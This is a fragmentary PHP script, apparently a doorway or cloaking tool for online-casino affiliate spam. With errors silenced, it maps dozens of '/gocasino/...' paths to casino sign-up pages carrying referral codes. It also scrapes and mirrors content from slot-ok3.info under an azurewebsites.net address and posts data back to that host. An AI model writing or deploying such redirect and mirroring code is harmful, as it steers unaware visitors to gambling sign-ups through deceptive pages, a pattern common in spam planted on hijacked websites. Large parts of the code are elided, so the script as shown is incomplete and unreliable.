...
error_reporting(0); 
function goto_handlers(){
$location = "";
    switch($_SERVER['REQUEST_URI']){



        case '/gocasino/formoney' : { 
            $location = 'https://directplay4win.com/landingpages/vulkan24gift/index.php?refCode=wp_w3004p162_slot4moreg';
            break;
        }
        case '/gocasino/formoney24' : { 
            $location = 'https://directplay4win.com/landingpages/vulkan24gift/index.php?refCode=wp_w3004p162_slot4moreg';
            break;
        }
        case '/gocasino/jackpot' : { 
            $location = 'https://directplay4win.com/landingpages/vulkan24gift/index.php?refCode=wp_w3004p162_slot4moreg';
            break;
        }
        case '/gocasino/columbus' : { 
            $location = 'https://mobywin7.com/?s=45&ref=wp_w3004p122_slotkktop&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/vulkan' : { 
            $location = 'https://mobywin7.com/?s=35&ref=wp_w3004p43_slotktopnew&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/gms' : { 
            $location = 'https://mobywin7.com/?s=39&ref=wp_w3004p46_slotkobzor&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/maxbet' : { 
            $location = 'https://mobywin7.com/?s=3&ref=wp_w3004r746947p3_sltok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/maxsbetslots' : { 
            $location = 'https://mobywin7.com/?s=3&ref=wp_w3004r746947p3_sltok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/eldorado' : { 
            $location = 'https://mobywin7.com/?s=2&ref=wp_w3004r746948p2_sltok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/faraon' : { 
            $location = 'https://mobywin7.com/?s=48&ref=wp_w3004r746949p129_sltok&url&popupAnchor=popup-reg';
            break;
        }
        ...
        case '/kazino-admiral/admiralcasinoclub.com' : { 
            $location = 'https://mobywin7.com/?s=45&ref=wp_w3004p122_slotkktop&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/slotvoyager' : { 
            $location = 'https://directplay4win.com/landingpages/vulkan24gift/index.php?refCode=wp_w3004p162_slot4moreg';
            break;
        }
        case '/gocasino/slotobar' : { 
        ...
        case '/gocasino/casinox' : { 
            $location = 'https://mobywin7.com/?s=52&ref=wp_w3004p163_worldcasinok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/vulkan24' : { 
            $location = 'https://mobywin7.com/?s=53&ref=wp_w3004p162_slktop&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/vulkancasino' : { 
            $location = 'https://mobywin7.com/?s=35&ref=wp_w3004r621351p43_slotok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/vulkan-deluxe' : { 
            $location = 'https://mobywin7.com/?s=35&ref=wp_w3004r621351p43_slotok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/super' : { 
        ...
        case '/gocasino/clubvulkan' : { 
            $location = 'https://mobywin7.com/?s=35&ref=wp_w3004r621351p43_slotok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/frank' : { 
            $location = 'https://mobywin7.com/?s=48&ref=wp_w3004p129_worldcasino&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/gmsdeluxe' : { 
            $location = 'https://mobywin7.com/?s=39&ref=wp_w3004p46_sltktop&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/loto-ru' : { 
            $location = 'https://mobywin7.com/?s=52&ref=wp_w3004p163_worldcasinok&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/vulkanobz' : { 
            $location = 'https://mobywin7.com/?s=35&ref=wp_w3004p43_slotktopnew&url&popupAnchor=popup-reg';
            break;
        }
        case '/gocasino/slotv' : { 
        ...
        case '/gocasino/slotozal' : { 
            $location = 'https://mobywin7.com/?s=8&ref=wp_w3004p8_slotok&url&popupAnchor=popup-reg';
            break;
        }
...
curl_close( $ch );
$bodytag = str_replace( "((?!slot-ok3\.info/b)\w+(?:\.\w+)+", "https://slot-ok.azurewebsites.net/", $contents );
$result  = preg_replace( '~' . $new_url . '~m', "https://slot-ok.azurewebsites.net", $contents );
preg_match_all( "/(https:\/\/slot-ok3.info).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
...
if ( file_exists( $cachefile ) ) {
	...
	jQuery(document).ready(function($) {
		...
		jQuery.post( "https://slot-ok3.info/slotok.php", data, function(response) {
			if(response == 0){
